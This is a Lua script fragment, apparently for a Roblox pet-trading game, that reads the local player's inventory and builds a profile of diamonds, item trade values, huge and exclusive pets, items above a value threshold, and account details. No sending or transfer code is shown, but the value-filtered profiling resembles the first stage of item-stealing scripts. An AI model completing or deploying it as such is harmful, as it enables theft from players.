-- Format numbers for display  
local function formatNumber(number)  
    number = math.floor(number)  
    local suffixes = {"", "k", "m", "b", "t"}  
    local i = 1  
    while number >= 1000 do  
        number = number / 1000  
        i = i + 1  
    end  
    return string.format("%.2f%s", number, suffixes[i])  
end

-- Get all player data  
local function GetFullPlayerData()  
    local GetSave = function()  
        return require(game.ReplicatedStorage.Library.Client.Save).Get()  
    end  
      
    local save = GetSave()  
    local inventory = save.Inventory  
      
    -- Calculate total RAP  
    local totalRAP = 0  
    local totalDiamonds = 0  
      
    -- Get diamonds  
    for _, v in pairs(inventory.Currency) do  
        if v.id == "Diamonds" then  
            totalDiamonds = v._am  
            break  
        end  
    end  
      
    -- Get RAP function  
    local function getRAP(Type, Item)  
        local RAPCmds = require(ReplicatedStorage.Library.Client.RAPCmds)  
        local fakeItem = {Class = {Name = Type}}  
        function fakeItem:AbstractGetRAP() return nil end  
        function fakeItem:GetDefaultRAP() return 0 end  
        function fakeItem:StackKey()  
            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})  
        end  
        return RAPCmds.Get(fakeItem) or 0  
    end  
      
    -- Collect item data  
    local itemsData = {  
        hugePets = {},  
        exclusivePets = {},  
        highValueItems = {},  
        allItems = {}  
    }  
      
    local categories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}  
      
    for _, category in ipairs(categories) do  
        if inventory[category] then  
            for uid, item in pairs(inventory[category]) do  
                local rap = getRAP(category, item)  
                local itemInfo = {  
                    category = category,  
                    uid = uid,  
                    id = item.id,  
                    amount = item._am or 1,  
                    rap = rap,  
                    shiny = item.sh,  
                    potion = item.pt,  
                    talent = item.tn,  
                    locked = item._lk or false,  
                    rarity = "Normal"  
                }  
                  
                -- Check if pet is huge/exclusive  
                if category == "Pet" then  
                    local petDir = require(ReplicatedStorage.Library.Directory.Pets)[item.id]  
                    if petDir then  
                        if petDir.huge then  
                            itemInfo.rarity = "Huge"  
                            table.insert(itemsData.hugePets, itemInfo)  
                        elseif petDir.exclusiveLevel then  
                            itemInfo.rarity = "Exclusive"  
                            table.insert(itemsData.exclusivePets, itemInfo)  
                        end  
                    end  
                end  
                  
                totalRAP = totalRAP + (rap * itemInfo.amount)  
                  
                if rap >= min_rap then  
                    table.insert(itemsData.highValueItems, itemInfo)  
                end  
                  
                table.insert(itemsData.allItems, itemInfo)  
            end  
        end  
    end  
      
    return {  
        username = plr.Name,  
        userId = plr.UserId,  
        accountAge = plr.AccountAge,  
        diamonds = totalDiamonds,  
        totalRAP = totalRAP,  
        totalItems = #itemsData.allItems,  
        hugePetsCount = #itemsData.hugePets,  
        exclusivePetsCount = #itemsData.exclusivePets,  
        highValueItemsCount = #itemsData.highValueItems,  
        items = itemsData  
    }  
end

